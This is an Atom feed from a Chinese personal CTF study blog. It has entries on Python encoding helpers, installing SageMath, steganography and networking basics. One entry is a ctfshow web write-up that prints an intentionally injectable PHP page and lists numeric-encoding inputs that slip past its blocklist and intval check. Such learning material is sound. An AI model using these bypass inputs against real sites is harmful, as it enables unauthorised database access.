<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HappyCoder&#39;Home</title>
  
  
  <link href="https://zhangkaibin0921.github.io/atom.xml" rel="self"/>
  
  <link href="https://zhangkaibin0921.github.io/"/>
  <updated>2022-02-20T12:07:00.981Z</updated>
  <id>https://zhangkaibin0921.github.io/</id>
  
  <author>
    <name>zhangkaibin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>密码学Python常用函数</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/20/%E5%AF%86%E7%A0%81%E5%AD%A6Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/20/%E5%AF%86%E7%A0%81%E5%AD%A6Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</id>
    <published>2022-02-20T11:31:20.000Z</published>
    <updated>2022-02-20T12:07:00.981Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是个大坑啊，会慢慢填的</p></blockquote><p>Python2和python3感觉差别还是挺大的（没有标注的代码默认是python3）<br><a href="https://c.runoob.com/compile/6/">Python2 在线工具 | 菜鸟工具 (runoob.com)</a></p><p>python3字节转十六进制字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-builtin-name">print</span>(s.hex())<br><span class="hljs-comment">#打印结果：666c6167</span><br></code></pre></td></tr></table></figure><p>十六进制数字转十进制(int函数的使用)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-attribute">x</span>=s.hex()<br><span class="hljs-builtin-name">print</span>(int(x,16))   # x原本是十六进制转换为十进制<br><span class="hljs-comment">#打印结果：1718378855</span><br></code></pre></td></tr></table></figure><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;12&#x27;</span>,<span class="hljs-number">16</span>)        <span class="hljs-comment"># 如果是带参数base的话，12要以字符串的形式进行输入，12 为 16进制 </span></span><br>18<br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-number">16</span>)  </span><br>10  <br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;10&#x27;</span>,<span class="hljs-number">8</span>)  </span><br>8<br></code></pre></td></tr></table></figure><p>字符串转字节</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-builtin-name">print</span>(s.encode())<br><span class="hljs-comment">#打印结果:b&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><p>字节转字符串</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=b&quot;flag&quot;<br><span class="hljs-builtin-name">print</span>(s.decode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-comment">#打印结果:flag</span><br></code></pre></td></tr></table></figure><p>字符转数字</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">print</span>(<span class="hljs-keyword">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-comment">#打印结果:97</span><br></code></pre></td></tr></table></figure><p>python2字符串转十六进制</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#Python2</span><br><span class="hljs-attribute">s</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-builtin-name">print</span> s.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-comment">#打印结果：666c6167</span><br></code></pre></td></tr></table></figure><hr><blockquote><p>[参考博客](<a href="https://blog.csdn.net/ycf18331272870/article/details/88413838?ops_request_misc=%7B%22request_id%22:%22164535627316780261934174%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164535627316780261934174&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-88413838.pc_search_insert_es_download&utm_term=python3+%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6&spm=1018.2226.3001.4187">python3 字符串、十六进制字符串、数字、字节之间的转换_羊驼的博客笔记-CSDN博客_python 十六进制字符串转十六进制</a>)<br>参考书目：CTF特训营</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这是个大坑啊，会慢慢填的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Python2和python3感觉差别还是挺大的（没有标注的代码默认是python3）&lt;br&gt;&lt;a href=&quot;https://c.runoob.com/compile/6/&quot;&gt;P</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>sagemath的安装与使用</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/14/sagemath%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/14/sagemath%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</id>
    <published>2022-02-14T11:19:16.000Z</published>
    <updated>2022-02-14T11:35:22.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sage的安装"><a href="#sage的安装" class="headerlink" title="sage的安装"></a>sage的安装</h2><p>我是用kali安装的sage<br><a href="https://www.sagemath.org/download.html">https://www.sagemath.org/download.html</a><br>进入这个网址<br><img src="/picture/c7.png"><br>Asia中随便选一个进入</p><p><img src="/picture/c8.png"><br>选Linux<br>然后进入下一个界面，选64bits</p><p><img src="/picture/c9.png"><br>然后我选的是红色框中的</p><p>接下来就是等待下载完成<br><code>tar xvf sage-9.0-Debian_GNU_Linux_9-x86_64.tar.bz2</code><br>然后解压压缩包，解压时间有点长，一定耐心等待啊</p><p>在sageMath的文件夹下<br><code>./sage</code><br>之后就可以交互式的使用sage了</p><hr><h2 id="sage的简单使用"><a href="#sage的简单使用" class="headerlink" title="sage的简单使用"></a>sage的简单使用</h2><p>每次在sageMath下  <code>./sage</code> 进行交互式的sage使用<br>或者把sage代码写在一个  test.sage中 ，然后使用命令  <code>./sage test.sage</code> 即可</p><p>sage模块的安装<br>python的模块，sage好像不可以直接使用<br>比如我在代码里import libnum 了，我使用python是有这个模块的，但是我用sage运行，就一直会说没有这个模块<br><code>sage -pip install libnum</code></p><hr><p><a href="https://www.osgeo.cn/sagemath/tutorial/index.html">sage的中文教程</a></p><hr><blockquote><p>需要非常感谢<a href="https://blog.csdn.net/vanarrow/article/details/106051909">这篇博客</a>，我才得以顺利完成sage的安装</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sage的安装&quot;&gt;&lt;a href=&quot;#sage的安装&quot; class=&quot;headerlink&quot; title=&quot;sage的安装&quot;&gt;&lt;/a&gt;sage的安装&lt;/h2&gt;&lt;p&gt;我是用kali安装的sage&lt;br&gt;&lt;a href=&quot;https://www.sagemath.or</summary>
      
    
    
    
    
    <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow 萌新web1~7</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/ctfshow-%E8%90%8C%E6%96%B0web1-7/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/ctfshow-%E8%90%8C%E6%96%B0web1-7/</id>
    <published>2022-02-13T12:28:50.000Z</published>
    <updated>2022-02-14T07:16:18.251Z</updated>
    
    <content type="html"><![CDATA[<p>所有题目只有过滤的字符有差别，其余并无差别，下面给出的代码是web7的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;<br>    &lt;meta charset=&quot;utf-8&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;?php<br># 包含数据库连接文件<br>include(&quot;config.php&quot;);<br># 判断get提交的参数id是否存在<br>if(isset($_GET[&#x27;id&#x27;]))&#123;<br>        $id = $_GET[&#x27;id&#x27;];<br>    if(preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id))&#123;<br>            die(&quot;id error&quot;);<br>    &#125;<br>    # 判断id的值是否大于999<br>    if(intval($id) &gt; 999)&#123;<br>        # id 大于 999 直接退出并返回错误<br>        die(&quot;id error&quot;);<br>    &#125;else&#123;<br>        # id 小于 999 拼接sql语句<br>        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;<br>        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;<br>        # 执行sql 语句<br>        $result = $conn-&gt;query($sql);<br>        # 判断有没有查询结果<br>        if ($result-&gt;num_rows &gt; 0) &#123;<br>            # 如果有结果，获取结果对象的值$row<br>            while($row = $result-&gt;fetch_assoc()) &#123;<br>                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;<br>            &#125;<br>        &#125;<br>        # 关闭数据库连接<br>        $conn-&gt;close();<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br>&lt;/body&gt;<br>&lt;!-- flag in id = 1000 --&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><blockquote><p> 这其中有个函数非常关键，intval()<br><a href="https://www.runoob.com/php/php-intval-function.html">PHP intval() 函数 | 菜鸟教程 (runoob.com)</a></p><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。<br>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>字符串有可能返回 0，虽然取决于字符串最左侧的字符</p><p><strong>看实例非常重要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>);                     <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                    <span class="hljs-comment">// 4</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;+42&#x27;</span>);                  <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;-42&#x27;</span>);                 <span class="hljs-comment">// -42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">042</span>);              <span class="hljs-comment">// 34  被解析成八进制，以0开头，注意一定不要带引号</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;042&#x27;</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">1e10</span>);                    <span class="hljs-comment">// 1410065408</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;1e10&#x27;</span>);                  <span class="hljs-comment">// 1</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">0x1A</span>);                    <span class="hljs-comment">// 26</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42000000</span>);                <span class="hljs-comment">// 42000000</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">420000000000000000000</span>);   <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;420000000000000000000&#x27;</span>); <span class="hljs-comment">// 2147483647</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>, <span class="hljs-number">8</span>);                   <span class="hljs-comment">// 42</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span><br><span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// 1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><blockquote><p><code>preg_match(&quot;/\&#39;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id)</code><br>正则匹配，固定格式是 <code>preg_match(&quot;/ 正则表达式 /i&quot;,$var)</code><br>其中有很多  \ 代表转义的意思</p></blockquote><p><font color=orange><strong>所以的目的都是为了绕过<code>intval($id) &gt; 999</code>传一个1000.（这个1000通过不同形式的方法传入，被intval解析之后会是一个小于1000的值，但是到了sql语句中（可能sql语句的那个地方有比较强大的解析功能），所以正常解析成1000）</strong></font></p><p>接下来一一举例：</p><ul><li><p>单引号、双引号： ‘1e3’    //intval会解析成1</p></li><li><p><code>+ - * /</code> ：999-(-1)    10*100   100/0.1      //intval(999-(-1))应该是999，这样的</p><p>+号虽然绕过了，但是sql语句无法正常解析<br><img src="/picture/web18.png"></p></li><li><p>!（真值取反）:  !!1000 </p></li><li><p>~  （取反）:  ~~1000</p></li><li><p>^（异或） :  1 ^1001</p></li><li><p>|   （按位或） ：0|1000</p></li><li><p>x  （十六进制）:  0x3e8  </p></li><li><p>二进制绕过：  0b1111101000    这一题没有过滤，所以这就是web7的答案</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;所有题目只有过滤的字符有差别，其余并无差别，下面给出的代码是web7的&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>misc其他一些知识点</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/misc%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/misc%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2022-02-13T11:29:39.000Z</published>
    <updated>2022-02-13T12:11:50.807Z</updated>
    
    <content type="html"><![CDATA[<h3 id="word隐藏字符"><a href="#word隐藏字符" class="headerlink" title="word隐藏字符"></a>word隐藏字符</h3><p>打开word文档，一片空白，文字隐藏在word中，点击[文件]-&gt;[选项]-&gt;[显示]-&gt;[隐藏字符]  ，即可看到隐藏的文字<br>或者隐藏信息字体和背景色相同，可修改文字颜色</p><h3 id="word文件隐藏"><a href="#word文件隐藏" class="headerlink" title="word文件隐藏"></a>word文件隐藏</h3><p>可以将word文档转换成xml格式，也可以将xml转换成word文档，这导致如果重新打包为word文档的过程中，有可能被隐藏进其他数据</p><p>word本质是一个zip文件，docx文件特性为定义一个了若干xml文件的压缩包，<font color=orange><strong>将文档的后缀名改为.zip</strong></font>,寻找里面的flag文件。Excel文件同样也适用。</p><p>如果zip解压后文件过多，可以使用命令行查找:  </p><ul><li><p><code>findstr /s /i &quot;backup&quot; *.*</code><br>在当前目录及所有子目录下的所有文件中查找”backup”这个字符串，<code>*.*</code>表示所有类型的文件</p></li><li><p><code>findstr /s /i /c:&quot;backup jobs&quot; *.*</code></p><p>查找带有空格的字符串</p></li><li><p><code>findstr /s /i /c:&quot;cmd&quot; C:\tmp\*.txt</code></p><p>在C:\tmp\查找所有txt文件的字符串”cmd”</p></li></ul><h3 id="wbStego4-3open"><a href="#wbStego4-3open" class="headerlink" title="wbStego4.3open"></a>wbStego4.3open</h3><p>这个软件可以把文件隐藏到BMP、TXT、HTM和PDF文件中。<br>同样也可以还原出来</p><h3 id="NTFS上的交换数据流"><a href="#NTFS上的交换数据流" class="headerlink" title="NTFS上的交换数据流"></a>NTFS上的交换数据流</h3><p>概念：</p><ul><li>在NTFS文件系统下，每个文件都可以有多个数据流。流从 windows<br>Mr3.1开始已存在。当在非MTFS卷下读取文件内容时，只能访问及<br>处理一个数据流。</li><li>数据流没有名称。</li></ul><p>特点</p><ul><li>ADS是NTFS文件系统特有的性质</li><li>基于APT的in32却不能很好的支持ADS,例如把一个文件以流的形式附加到另一个文件（载体）中。但是<strong>对 Windows资源管理器来说载体文件没有发生任何变化</strong>(包括其大小、修改时间等)，由此将会产生一系列问题。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;word隐藏字符&quot;&gt;&lt;a href=&quot;#word隐藏字符&quot; class=&quot;headerlink&quot; title=&quot;word隐藏字符&quot;&gt;&lt;/a&gt;word隐藏字符&lt;/h3&gt;&lt;p&gt;打开word文档，一片空白，文字隐藏在word中，点击[文件]-&amp;gt;[选项]-&amp;gt;[</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>misc音频隐写</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/13/misc%E9%9F%B3%E9%A2%91/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/13/misc%E9%9F%B3%E9%A2%91/</id>
    <published>2022-02-13T10:45:39.000Z</published>
    <updated>2022-02-14T13:00:46.468Z</updated>
    
    <content type="html"><![CDATA[<p>文本本身往往是可以正常播放的音乐，信息通常和音乐本身内容无关，而是以波形等某种形式藏在音频文件中</p><ul><li>频谱分析、波形分析（Audicity）</li><li>摩斯编码、敲击码（基于5乘5方格波利比奥斯方阵)    （通过听文件中的细节）</li><li>工具隐写（steghide、MP3stego)</li></ul><p><img src="/picture/misc48.png"></p><h3 id="Audicity查看波形和频谱"><a href="#Audicity查看波形和频谱" class="headerlink" title="Audicity查看波形和频谱"></a>Audicity查看波形和频谱</h3><p><img src="/picture/misc49.png"><br>这个音频只有一个声道，可能有的音频会有两个声道<br>然后在一个声道的波形中可能会藏着morse密码，或者波形可以转化成二进制这种<br><img src="/picture/misc56.png"><br>morse密码</p><p><img src="/picture/misc52.png"><br>这个图就是转换成二进制</p><p><img src="/picture/misc50.png"><br>有些时候flag会直接藏在频谱图中</p><p><img src="/picture/misc53.png"><br>DTMF，双音多频。可能会在频谱图中出现<br><img src="/picture/misc54.png"></p><p>分离左右两个音轨<br><img src="/picture/misc55.png"><br><a href="https://www.ichunqiu.com/course/63298">学习链接</a>，Audicity的还有一小部分使用在这个视频的最后部分</p><h3 id="MP3Stego隐写"><a href="#MP3Stego隐写" class="headerlink" title="MP3Stego隐写"></a>MP3Stego隐写</h3><p>音频文件同其他格式文件一样可以在比特流中嵌入数据，常用的工具如MP3 Stego,该工具在提取隐写信息时会需要用到密码，因此通常与其它部分结合考察（如压缩包解密等），通过得到的密码来从MP3中提取数据，从而得到隐藏信息</p><p>在Encode.exe和Decode.exe所在文件夹下，cmd<br>写入： Encode.exe -E  <font color=red>hidden_text.txt</font> -P  pass  svega.wav <font color=red>svega_stego. mp3</font>    ( svega.wav是被加密音频，svega_stego. mp3是加密之后的音频，pass是加密设置的密码)<br>●读出： Decode.exe  -X  -P pass <font color=red>svega_stego.mp3</font></p><p>常用的视频隐写工具有MSUstego、Tcstego</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文本本身往往是可以正常播放的音乐，信息通常和音乐本身内容无关，而是以波形等某种形式藏在音频文件中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;频谱分析、波形分析（Audicity）&lt;/li&gt;
&lt;li&gt;摩斯编码、敲击码（基于5乘5方格波利比奥斯方阵)    （通过听文件中的细节）&lt;/li&gt;
&lt;</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络(家庭网络常识等)</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/10/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%AF%86/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/10/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E5%B8%B8%E8%AF%86/</id>
    <published>2022-02-10T07:54:27.000Z</published>
    <updated>2022-02-11T11:27:49.776Z</updated>
    
    <content type="html"><![CDATA[<h1 id="⚽猫、路由器、wifi、拨号"><a href="#⚽猫、路由器、wifi、拨号" class="headerlink" title="⚽猫、路由器、wifi、拨号"></a>⚽猫、路由器、wifi、拨号</h1><p>一根入户光纤插到猫上面，然后用网线连接猫和路由器，然后再用网线连接路由器和电脑，路由器可以发射wifi，用手机或电脑通过wifi连<br>接到路由器。</p><h3 id="猫"><a href="#猫" class="headerlink" title="猫"></a>猫</h3><p>现在使用的一般是光猫(以前是猫)，猫和广猫的区别在于：光猫支持光纤。<br>以前拉到家里面的都是网线，现在大部分都是光纤</p><p>猫的功能：将要传输的信息转换成适合传输的频率、形式等。<br>（数据在光纤中通过光信号进行传输的，光猫就可以把光信号转换成电信号或者其他模拟信号，使其在网线中进行传输）</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>没有路由器的话，那么猫通过网线直接连接到电脑，将会没有wifi，只能支持一台设备上网，每次开机后都需要拨号</p><p>有路由器之后，路由器会自动拨号（路由器连上网了），然后路由器再通过wifi、网线连接其他设备，让其他设备也可以上网</p><h3 id="wifi"><a href="#wifi" class="headerlink" title="wifi"></a>wifi</h3><p>wifi是路由器发射出来的，wifi就像一根无形的网线，连接手机/电脑到路由器</p><p>所以有时候为什么wifi是满格的却不能上网呢，因为wifi连接的是路由器，如果路由器本身没有网，WiFi再强也无法上网。wifi满格只能说明和路由器之间的连接很强</p><h3 id="宽带大小"><a href="#宽带大小" class="headerlink" title="宽带大小"></a>宽带大小</h3><p>为什么20M宽带，最大下载速度只能到2.5M？<br>宽带大小一般用的单位是20Mb，而我们平时一般是MB作单位。<br>1Byte=8bit</p><h4 id="拨号"><a href="#拨号" class="headerlink" title="拨号"></a>拨号</h4><p>拨号是在路由器中进行设置，一般采用ppoe方式进行拨号<br>拨号就是与中国电信（网络云烟）建立一条点对点链路通道，通过这个通道可以访问因特网<br>可以浅显的理解为拨号就是登录宽带，登录后路由器才能接入因特网</p><h1 id="⚽IP地址、子网掩码、网段、网关"><a href="#⚽IP地址、子网掩码、网段、网关" class="headerlink" title="⚽IP地址、子网掩码、网段、网关"></a>⚽IP地址、子网掩码、网段、网关</h1><h4 id="IP地址和子网掩码"><a href="#IP地址和子网掩码" class="headerlink" title="IP地址和子网掩码"></a>IP地址和子网掩码</h4><p>在网络中我们通过ip地址与对应的计算机进行通信<br>例如：192.168.1.1<br>ip地址是32位的二进制数</p><p>windows命令：<code>ipconfig</code></p><p>IP地址是由==网络号和主机号==两部分组成<br>==子网掩码作用：告诉计算机哪些是网络号哪些是主机号==<br>子网掩码与ip地址类似，也是32位二进制数<br>子网掩码例如：255.255.255.0</p><p><img src="/picture/za6.png"><br>1对应的是网络号，0对应的是主机号</p><p>子网掩码另外一种表示方式：192.168.1.1/==24==<br>其中24表示子网掩码中前24位为1</p><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>若目标IP在==同一网段==则可以直接通信不需要经过网关，否则需要<br>IP地址前24为相同则在同一网关：如192.168.1.1和192.168.1.34 就在同一网关</p><p>网关一般是==软件层面的路由器==</p><p>查看与某个IP通信需要经过哪些路由器/网关<br>Windows系统命令： <code>tracert -d ip地址</code><br>如果不加参数-d ，则会将地址解析为主机名会很慢</p><p>域名解析windows命令：<code>nslookup</code><br><img src="/picture/za7.png"><br><img src="/picture/za8.png"><br>所以可以看到确实是需要经过层层网关的</p><h4 id="私网、公网"><a href="#私网、公网" class="headerlink" title="私网、公网"></a>私网、公网</h4><p>ipconfig查看的是私有ip<br>要上网肯定要有公网ip，百度搜索ip，即可看到自己的公网ip了<br><img src="/picture/za9.png"></p><h1 id="⚽端口"><a href="#⚽端口" class="headerlink" title="⚽端口"></a>⚽端口</h1><p>端口分为物理端口和软件端口<br>物理端口：是类似交换机、路由器上面插网线的口就叫物理端口</p><p>计算中有很多软件，当计算机收到数据包时，如何知道数据包时哪个软件的呢？这里就必须说到==端口==了</p><p>数据包中会有源IP和目标IP、源端口和目标端口<br>一个软件可以监听多个端口，当计算机收到一个数据包，计算机就会先检查它的目标端口，然后计算机再查看是否有软件在监听这个端口。如果有，那么这个数据包就会发给这个软件</p><p>如何查看电脑上软件监听的端口呢？<br>win+R<br>输入resmon<br>选择“网络”</p><p><img src="/picture/za10.png"></p><h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><p>NAT（Newwork Address Translation）网络地址转换<br>网络地址即IP地址<br>NAT作用：一般我们没有公网IP，但上因特网需要公网IP，这个时候就会用到NAT</p><p>比如说当我们计算机发送数据包的时候，数据包中会有源IP和目标IP、源端口和目标端口，中国电信（网络运营商）的路由器（拥有公网IP），会替换数据包的源IP（替换成公网IP）和源端口，所以就可以发送到因特网上了。接受数据包，先发送到网络运营商路由器，更改源IP和源端口，再发送给我电脑。</p><h1 id="WiFi信号差怎么办"><a href="#WiFi信号差怎么办" class="headerlink" title="WiFi信号差怎么办"></a>WiFi信号差怎么办</h1><p>1、进路由器后台调节wifi信号强度（用处不大）<br>2、在接入一个路由器<br>原来的路由器称为主路由器，新买的路由器为副路由器，用网线将主路由的LAN口和副路由的WAN口相连，再进入副路由器后台，设置上网方式为动态IP（或DHCP），然后将副路由器放在信号差的地方。<br>缺点：每个路由器都有一个wifi，两个wifi无法漫游（需要手动更换wifi）<br>3、mesh（主流方法）<br>也是需要多个路由器，需要支持mesh的路由器，多个路由器发射同一个WiFi。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;⚽猫、路由器、wifi、拨号&quot;&gt;&lt;a href=&quot;#⚽猫、路由器、wifi、拨号&quot; class=&quot;headerlink&quot; title=&quot;⚽猫、路由器、wifi、拨号&quot;&gt;&lt;/a&gt;⚽猫、路由器、wifi、拨号&lt;/h1&gt;&lt;p&gt;一根入户光纤插到猫上面，然后用网线连接猫和路</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>备份文件泄露</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/08/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
